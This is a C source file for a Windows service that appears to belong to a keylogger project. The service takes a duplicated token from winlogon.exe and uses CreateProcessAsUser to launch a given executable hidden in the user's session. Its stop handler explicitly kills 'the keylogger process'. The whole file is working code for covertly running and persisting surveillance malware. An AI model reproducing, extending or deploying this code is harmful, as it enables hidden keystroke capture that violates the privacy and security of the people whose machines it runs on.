#include "svc.h"

VOID WINAPI svc_main(DWORD argc, LPTSTR* argv)
{
    if (argc <= 1)
        return;

    // Register the handler function for the service.
    // This function connects the service to the SCM (Service Control Manager).
    // 'svc_ctrl_handler' is the function that will handle control requests (e.g., stop, pause).
    g_svc_status_handle = RegisterServiceCtrlHandler(
        SVC_NAME,
        svc_ctrl_handler);

    // Check if the registration of the control handler failed.
    if (!g_svc_status_handle)
        return;

    // Initialize the SERVICE_STATUS structure members that will remain constant.
    // 'dwServiceType' indicates the type of service (here, it's a service running in its own process).
    // 'dwServiceSpecificExitCode' is set to 0, meaning no specific exit code is used.
    g_svc_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svc_status.dwServiceSpecificExitCode = 0;

    // Report the initial status of the service to the SCM.
    // This informs the SCM that the service is in the process of starting (SERVICE_START_PENDING).
    // A delay of 3000 milliseconds is provided for the start-up process.
    report_svc_status(SERVICE_START_PENDING, NO_ERROR, 3000);

    // Create an event for service stop notification.
    // 'CreateEvent()' sets up a manual-reset event which will be signaled when the service should stop.
    g_svc_stop_event = CreateEvent(
        NULL,    // Default security attributes
        TRUE,    // Manual reset event
        FALSE,   // Initial state is non-signaled
        NULL);   // No name

    // Check if the event creation failed.
    // If creation fails, report service status as stopped.
    if (g_svc_stop_event == NULL)
    {
        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    // Report service status as running once initialization is complete.
    // This informs the Service Control Manager that the service is now active.
    report_svc_status(SERVICE_RUNNING, NO_ERROR, 0);

    // Attempt to impersonate the winlogon.exe process.
    // 'impersonate_winlogon()' is used to gain the security context of the winlogon process.
    HANDLE dup_token = get_winlogon_duptoken();
    if (!dup_token)
    {
        // Report service status as stopped if impersonation fails.
        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION proc_info = { 0 };

    // Attempt to create a new process using the duplicated token, without showing a window.
    if (!CreateProcessAsUser(dup_token,     // Handle to the duplicated token (used for impersonation)
        NULL,          // Application name (NULL if part of command line)
        argv[1],       // Command line (argv[1] contains the executable path)
        NULL,          // Process security attributes (NULL for default)
        NULL,          // Thread security attributes (NULL for default)
        FALSE,         // Inherit handles flag (FALSE to not inherit)
        CREATE_NO_WINDOW, // Creation flags (CREATE_NO_WINDOW to run without a console window)
        NULL,          // Environment (NULL to use the parent process's environment)
        NULL,          // Current directory (NULL to use the parent process's directory)
        &info,         // Pointer to STARTUPINFO structure
        &proc_info))   // Pointer to PROCESS_INFORMATION structure
    {
        return;
    }
    CloseHandle(dup_token);

    // Wait indefinitely until the stop event is signaled.
    // The service will continue to run until the stop event is set.
    //WaitForSingleObject(g_svc_stop_event, INFINITE);
    WaitForSingleObject(proc_info.hProcess, INFINITE);
    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);
    CloseHandle(g_svc_stop_event);

    // Report service status as stopped when the stop event is signaled.
    // This indicates that the service has stopped successfully.
    report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
    return;
}

VOID report_svc_status(DWORD current_state,
    DWORD win32_exit_code,
    DWORD wait_hint)
{
    static DWORD checkpoint = 1;

    // Update the SERVICE_STATUS structure with the current service status.
    // 'current_state' specifies the current state of the service (e.g., running, stopped).
    // 'win32_exit_code' provides the error code if the service fails.
    // 'wait_hint' is a hint to the SCM on how long to wait before checking the status again.
    g_svc_status.dwCurrentState = current_state;
    g_svc_status.dwWin32ExitCode = win32_exit_code;
    g_svc_status.dwWaitHint = wait_hint;

    // Set the controls accepted by the service based on its current state.
    // While the service is starting, it does not accept any controls.
    // Once running or stopped, it only accepts stop control requests.
    if (current_state == SERVICE_START_PENDING)
        g_svc_status.dwControlsAccepted = 0;
    else
        g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    // Set the checkpoint value to indicate progress during start or stop operations.
    // Checkpoint is used to help the SCM track the progress of the service.
    // Reset checkpoint to 0 if the service is running or stopped.
    if ((current_state == SERVICE_RUNNING) ||
        (current_state == SERVICE_STOPPED))
        g_svc_status.dwCheckPoint = 0;
    else
        g_svc_status.dwCheckPoint = checkpoint++;

    // Report the updated service status to the Service Control Manager.
    // This informs the SCM about the current state and progress of the service.
    SetServiceStatus(g_svc_status_handle, &g_svc_status);
}

VOID WINAPI svc_ctrl_handler(DWORD ctrl)
{
    // Handle the requested control code sent by the Service Control Manager.
    switch (ctrl)
    {
    case SERVICE_CONTROL_STOP:
        // Report that the service is in the process of stopping.
        report_svc_status(SERVICE_STOP_PENDING, NO_ERROR, 0);

		// Kill the keylogger process before stopping the service.
        kill_winkey_process();

        // Signal the service to stop by setting the stop event.
        // This will cause the service to exit its main loop.
        SetEvent(g_svc_stop_event);

        // Update the service status to indicate that it has stopped.
        report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);

        return;

    case SERVICE_CONTROL_INTERROGATE:
        // This control code is used to request the service status.
        // Typically, no action is needed; the SCM polls the service status automatically.
        break;

    default:
        // Handle other control codes as needed.
        // By default, do nothing for unhandled control codes.
        break;
    }
}
